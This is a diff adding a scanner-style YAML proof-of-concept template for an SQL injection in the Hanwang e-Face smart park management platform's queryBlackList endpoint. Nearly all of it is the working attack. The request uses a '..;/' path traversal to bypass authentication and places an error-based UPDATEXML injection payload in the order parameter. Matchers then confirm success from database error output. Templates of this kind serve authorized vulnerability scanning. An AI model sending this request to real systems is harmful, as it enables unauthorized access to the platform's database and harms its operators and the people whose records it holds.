@@ -1,0 +1,27 @@
+id: poc-yaml-hw-e-face-pass-spmp-queryblacklist-sqli
+info:
+  name: 汉王e脸通智慧园区管理平台 queryBlackList SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        GET /manage/dgmCommand/finishRegister.do/..;/..;/systemBlackList/queryBlackList.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,{{t2}},(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+          - "java.sql.SQLException"
+          - "{{t2}}"
